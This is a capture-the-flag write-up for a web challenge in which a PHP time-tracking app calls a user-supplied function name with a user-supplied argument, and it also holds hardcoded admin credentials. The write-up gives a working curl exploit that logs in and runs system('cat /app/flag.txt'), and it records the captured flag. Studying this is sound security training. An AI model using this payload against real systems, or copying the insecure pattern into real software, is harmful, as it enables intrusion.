# TimeTracker

- **Lab / Category:** Web
- **Points:** 110
- **Difficulty:** easy
- **Challenge ID:** `8b400d37-1c88-4e08-91cb-58bfc43e066d`
- **Status:** ✅ SOLVED

## Description
My employees have been arriving late recently, so I purchased this time tracking
application. Can you check if there are any security vulnerabilities?

## Vulnerability — PHP arbitrary function call → RCE
`index.php`, `process_data` action:

```php
case 'process_data':
    if (isset($_GET['processor']) && isset($_GET['data'])) {
        $processor = $_GET['processor'];
        $data = $_GET['data'];
        if ($processor === 'calculate_overtime') { ... }
        elseif ($processor === 'format_currency') { ... }
        elseif ($processor === 'validate_hours') { ... }
        else {
            $processor($data);   // <-- user controls BOTH the function name and its argument
        }
    }
```

Any unrecognised `processor` value is called as a function with attacker-controlled
`data` as its single argument → `system($cmd)` gives direct command execution.

Auth gate is trivial: credentials are hardcoded in the same source
(`$_POST['username']==='admin' && $_POST['password']==='admin123'`).

## Exploit
```bash
B=http://<instance>.playat.flagyard.com
# 1) authenticate (hardcoded creds), keep session cookie
curl -s -c c.txt -d "username=admin&password=admin123" "$B/index.php"
# 2) RCE via arbitrary function call
curl -s -b c.txt -G "$B/index.php" \
     --data-urlencode "action=process_data" \
     --data-urlencode "processor=system" \
     --data-urlencode "data=cat /app/flag.txt"
```

## Findings
- `id` -> `uid=1000 gid=1000` (RCE confirmed).
- Flag file at `/app/flag.txt`; also exposed as env var `DYN_FLAG`.

## Flag
`FlagY{9f3b55c8f6341735ac018f82dc419fa1}`

_Submission: ACCEPTED (`isSuccess: true, message: "Success"`)._
